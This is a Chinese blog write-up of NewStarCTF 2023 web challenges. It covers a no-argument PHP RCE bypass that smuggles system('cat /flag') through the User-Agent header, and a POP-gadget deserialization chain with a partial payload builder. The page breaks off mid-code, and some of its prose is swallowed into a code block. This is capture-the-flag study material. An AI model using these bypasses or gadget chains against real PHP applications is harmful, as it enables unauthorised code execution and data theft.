<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="Hexo Theme Redefine"><meta name="author" content="Sh7err"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="canonical" href="http://example.com/2023/10/10/2023newstarctf/"><meta name="robots" content="index,follow"><meta name="googlebot" content="index,follow"><meta name="revisit-after" content="1 days"><meta name="description" content="记录一下newstarctf2023里面一些WEB题。"><meta property="og:type" content="article"><meta property="og:title" content="newstarctf2023一些web题记录"><meta property="og:url" content="http://example.com/2023/10/10/2023newstarctf/index.html"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="记录一下newstarctf2023里面一些WEB题。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/R!!C!!E!!-bannar.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/R!!C!!E!!-githack.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/R!!C!!E!!-leakinfo.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/R!!C!!E!!-flag.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/rce3.ls.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/RCE3.flag.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/midsql_1.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/flaskdisk1.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/flaskdisk2.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pharone1.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pharone2.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pharone3.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/injectme1.jpg"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/injectme_flag.jpg"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/final_disable.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/final_qs.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/final_rwx.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/final_suid.png"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/final_flag.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pickle_session.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pickle_flag.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pppython_hint.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pppython_apppy.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pppython_secret.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pearcmd_test.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pearcmd_shell.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pearcmd_flag.PNG"><meta property="article:published_time" content="2023-10-10T11:03:48.000Z"><meta property="article:modified_time" content="2023-11-30T12:36:42.047Z"><meta property="article:author" content="John Doe"><meta property="article:tag" content="ctf"><meta property="article:tag" content="无参rce"><meta property="article:tag" content="pop"><meta property="article:tag" content="unserialize"><meta property="article:tag" content="时间盲注"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/R!!C!!E!!-bannar.PNG"><link rel="icon" type="image/png" href="/images/deer.svg" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/deer.svg"><meta name="theme-color" content="#A31F34"><link rel="shortcut icon" href="/images/deer.svg"><title>newstarctf2023一些web题记录 - Sh7err&#39;s Blog</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/build/styles.css"><link rel="stylesheet" href="/fonts/fonts.css"><link rel="stylesheet" href="/fonts/Satoshi/satoshi.css"><link rel="stylesheet" href="/fonts/Chillax/chillax.css"><script id="hexo-configurations">let Global=window.Global||{};Global.hexo_config={hostname:"example.com",root:"/",language:"en"},Global.theme_config={articles:{style:{font_size:"18px",line_height:1.5,image_border_radius:"14px",image_alignment:"center",image_caption:!1,link_icon:!0},word_count:{enable:!0,count:!0,min2read:!0},author_label:{enable:!0,auto:!1,list:[]},code_block:{copy:!0,style:"mac",font:{enable:!1,family:null,url:null}},toc:{enable:!0,max_depth:3,number:!1,expand:!0,init_open:!0},copyright:!0,lazyload:!0,recommendation:{enable:!1,title:"推荐阅读",limit:3,mobile_limit:2,placeholder:"/images/wallhaven-wqery6-light.webp",skip_dirs:[]}},colors:{primary:"#A31F34",secondary:null},global:{fonts:{chinese:{enable:!1,family:null,url:null},english:{enable:!1,family:null,url:null}},content_max_width:"1000px",sidebar_width:"210px",hover:{shadow:!0,scale:!1},scroll_progress:{bar:!1,percentage:!0},website_counter:{url:"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",enable:!0,site_pv:!0,site_uv:!0,post_pv:!0},single_page:!0,open_graph:!0,google_analytics:{enable:!1,id:null}},home_banner:{enable:!0,style:"static",image:{light:"https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/1.webp",dark:"https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/1.webp"},title:"Sh7err's Blog",subtitle:{text:["干就完事了"],hitokoto:{enable:!1,api:"https://v1.hitokoto.cn"},typing_speed:100,backing_speed:80,starting_delay:500,backing_delay:1500,loop:!0,smart_backspace:!0},text_color:{light:"#fff",dark:"#d1d1b6"},text_style:{title_size:"2.8rem",subtitle_size:"1.5rem",line_height:1.2},custom_font:{enable:!1,family:null,url:null},social_links:{enable:!1,links:{github:null,instagram:null,zhihu:null,twitter:null,email:null},qrs:{weixin:null}}},plugins:{feed:{enable:!1},aplayer:{enable:!1,type:"fixed",audios:[{name:null,artist:null,url:null,cover:null}]},mermaid:{enable:!1,version:"9.3.0"}},version:"2.4.4",navbar:{auto_hide:!1,color:{left:"#f78736",right:"#367df7",transparency:35},links:{Home:{path:"/",icon:"fa-regular fa-house"},Archives:{path:"/archives",icon:"fa-regular fa-archive"}},search:{enable:!1,preload:!0}},page_templates:{friends_column:2,tags_style:"blur"},home:{sidebar:{enable:!0,position:"left",first_item:"menu",announcement:null,links:null},article_date_format:"auto",categories:{enable:!0,limit:3},tags:{enable:!0,limit:10}},footerStart:"2023/9/1 00:00:00"},Global.language_ago={second:"%s seconds ago",minute:"%s minutes ago",hour:"%s hours ago",day:"%s days ago",week:"%s weeks ago",month:"%s months ago",year:"%s years ago"},Global.data_config={masonry:!1}</script><link rel="stylesheet" href="/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/fontawesome/brands.min.css"><link rel="stylesheet" href="/fontawesome/solid.min.css"><link rel="stylesheet" href="/fontawesome/regular.min.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="progress-bar-container"><span class="pjax-progress-bar"></span> <span class="swup-progress-icon"><i class="fa-solid fa-circle-notch fa-spin"></i></span></div><main class="page-container" id="swup"><div class="main-content-container"><div class="main-content-header"><header class="navbar-container"><div class="navbar-content"><div class="left"><a class="logo-title" href="http://example.com/">Sh7err&#39;s Blog</a></div><div class="right"><div class="desktop"><ul class="navbar-list"><li class="navbar-item"><a href="/"><i class="fa-regular fa-house"></i> HOME</a></li><li class="navbar-item"><a href="/archives"><i class="fa-regular fa-archive"></i> ARCHIVES</a></li></ul></div><div class="mobile"><div class="icon-item navbar-bar"><div class="navbar-bar-middle"></div></div></div></div></div><div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color"><ul class="drawer-navbar-list flex flex-col justify-start items-center"><li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center"><a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group" href="/"><i class="fa-regular fa-house"></i> HOME</a></li><li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center"><a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group" href="/archives"><i class="fa-regular fa-archive"></i> ARCHIVES</a></li></ul></div><div class="window-mask"></div></header></div><div class="main-content-body"><div class="main-content"><div class="post-page-container"><div class="article-content-container"><div class="article-title"><h1 class="article-title-regular">newstarctf2023一些web题记录</h1></div><div class="article-header"><div class="avatar"><img src="/images/deer.svg"></div><div class="info"><div class="author"><span class="name">Sh7err</span> <span class="author-label">Lv2</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-pen-fancy"></i>&nbsp; <span class="desktop">2023-10-10 19:03:48</span> <span class="mobile">2023-10-10 19:03:48</span> <span class="hover-info">Created</span> </span><span class="article-date article-meta-item"><i class="fa-regular fa-wrench"></i>&nbsp; <span class="desktop">2023-11-30 20:36:42</span> <span class="mobile">2023-11-30 20:36:42</span> <span class="hover-info">Updated</span> </span><span class="article-tags article-meta-item"><i class="fa-regular fa-tags"></i>&nbsp;<ul><li><a href="/tags/ctf/">ctf</a>&nbsp;</li><li>| <a href="/tags/%E6%97%A0%E5%8F%82rce/">无参rce</a>&nbsp;</li><li>| <a href="/tags/pop/">pop</a>&nbsp;</li><li>| <a href="/tags/unserialize/">unserialize</a>&nbsp;</li><li>| <a href="/tags/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">时间盲注</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fa-regular fa-typewriter"></i>&nbsp;<span>8.5k Words</span> </span><span class="article-min2read article-meta-item"><i class="fa-regular fa-clock"></i>&nbsp;<span>39 Mins</span> </span><span class="article-pv article-meta-item"><i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content markdown-body"><p><strong>记录一下newstarctf2023里面一些WEB题。</strong></p><span id="more"></span><h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p>之前没做过这种专门针对RCE的题目，记录一下。<br>参考文章：<a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/15406272.html#_label1_4">无参RCE <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/R!!C!!E!!-bannar.PNG"><br>什么都没有，应该是要扫一下了，当时没扫出来，可能是线程太多扫太快了，服务器没反应过来，实际上应该能扫到<code>.git/</code>，那就说明是git信息泄露了，用git hack脚本打一下。<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/R!!C!!E!!-githack.PNG"><br>成功。到&#x2F;dist下面看一看<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/R!!C!!E!!-leakinfo.PNG"><br>爆信息了，有个bo0g1pop.php，进去看一下。<br>源码如下：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div><p>首先就是这个正则匹配<code>/[^\W]+\((?R)?\)/</code>的解释：</p><ul><li><code>[^\W]</code>中的<code>\W</code>表示除了<code>\w</code>以外的字符，<code>\w</code>表示字母、数字和下划线，所以<code>\W</code>表示除了数字、字母和下划线以外的所有字符，<code>[^....]</code>表示除了<code>[....]</code>中的所有字符，所以<code>[^\W]</code>就表示字母、数字和下划线，和<code>\w</code>是一个意思。</li><li><code>+</code>表示匹配之前的子表达式一次或多次（贪婪）</li><li><code>\(</code>和<code>\)</code>表示<code>(</code>和<code>)</code>，转义字符</li><li><code>(?R)</code>表示<strong>递归</strong>调用整个正则匹配表达式</li><li><code>?</code>表示匹配之前的子表示0次或1次</li></ul><p>根据表达式，被匹配到的字符会被空字符替代，也就是删除。总体的意思就是说匹配到所有的字母、数字和下划线加()的格式的字符都会被删除，最后剩下的是<code>;</code>的话就可以通过if判断。例如<code>a(b())</code>,首先会匹配到<code>b()</code>然后才是<code>a()</code>，我这里说的是结果，实际上是按照递归的方式匹配的，要理解递归。可以参考这篇文章：<a class="link" target="_blank" rel="noopener" href="https://juejin.cn/post/6972854176069992484">https://juejin.cn/post/6972854176069992484 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。<br>这里ban了很多方法，但是可以用<code>getallheaders()</code>来获取请求头中的信息，但是这里我们肯定把所有的信息都打出来，那样就没有意义了，我们需要利用其中的某些信息来作为另一个函数的参数，所谓的”无参RCE”。这里可以利用<code>current()</code>或者<code>pos()</code>函数来默认调取数组中第一行的信息，也就是<code>getallheaders()</code>中的host值，但是改这个参数会导致发包错误。<br>所以我们可以利用<code>next()</code>来调用数组中下一行的信心，也就是UA，我们可以把它改为我们想执行的命令，然后eval()就可以了。根据.git信息泄露，我们知道flag在&#x2F;flag下，那么把UA改成<code>system(&#39;cat /flag&#39;);</code>就可以了。<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/R!!C!!E!!-flag.PNG"><br>拿到flag，成功akweek2的web，舒服了。</p><h1 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h1><h2 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h2><p>有关pop链的一题，之前没打过，记录一下，还是学到挺多。<br>源码如下：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]); </span><br><span class="line">```   </span><br><span class="line">首先找漏洞的出口在哪,找了一圈没看到什么能执行恶意代码或者命令的函数.仔细一看,感觉`(<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>); `有点可疑,应该可以利用这个执行恶意代码.  </span><br><span class="line">开始找链子  </span><br><span class="line"><span class="number">1</span>. 从WhiteGod开始;既然要利用这个代码就要调用`<span class="title function_ invoke__">__unset</span>(<span class="variable">$var</span>)函数`,php文档的解释是:</span><br><span class="line">    &gt;当对不可访问（<span class="keyword">protected</span> 或 <span class="keyword">private</span>）或不存在的属性调用 <span class="keyword">unset</span>() 时，<span class="title function_ invoke__">__unset</span>() 会被调用。  </span><br><span class="line">    </span><br><span class="line">    所以这里要找一处调用不存在的属性的地方.</span><br><span class="line"><span class="number">2</span>. 到CTF;CTF类中的<span class="title function_ invoke__">end</span>()方法中的`<span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);`会调用`log`属性,正好WhiteGod类中没有这个属性.</span><br><span class="line"><span class="number">3</span>. 到Handle; `<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">    &#125;`这里正好调用了<span class="title function_ invoke__">end</span>()函数.那么我们现在需要找到调用<span class="title function_ invoke__">__call</span>(<span class="variable">$func</span>, <span class="variable">$vars</span>)方法的地方.  </span><br><span class="line">    根据php文档:  </span><br><span class="line">    &gt;在对象中调用一个不可访问方法时，<span class="title function_ invoke__">__call</span>() 会被调用。</span><br><span class="line"><span class="number">4</span>. 到Super;` <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">    &#125;`这里调用了<span class="title function_ invoke__">getStr</span>()函数,正好Handle中没有这个方法.</span><br><span class="line">    现在需要调用<span class="title function_ invoke__">__invoke</span>()方法.</span><br><span class="line">    php文档:</span><br><span class="line">    &gt;当尝试以调用函数的方式调用一个对象时，<span class="title function_ invoke__">__invoke</span>() 方法会被自动调用。</span><br><span class="line"><span class="number">5</span>. 到Then;`<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;`这里把func做函数来使用,我们可以给它一个Super类,这样就调用了<span class="title function_ invoke__">__invoke</span>()方法</span><br><span class="line"><span class="number">6</span>. 到Begin;正则匹配中会将变量转为<span class="keyword">string</span>类型,也就调用了<span class="title function_ invoke__">__toString</span>()方法.</span><br><span class="line"><span class="number">7</span>. <span class="title function_ invoke__">__destruct</span>()方法,这个析构函数在脚本关闭时调用,可以测试到,它会在整个脚本结束前调用以释放所有资源.所以我们不需要特别来调用它.  </span><br><span class="line">链子分析完来构造payload:   </span><br><span class="line">```php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="keyword">new</span> <span class="title class_">Then</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func=<span class="keyword">new</span> <span class="title class_">Super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj=<span class="keyword">new</span> <span class="title class_">Handle</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj=<span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle=<span class="keyword">new</span> <span class="title 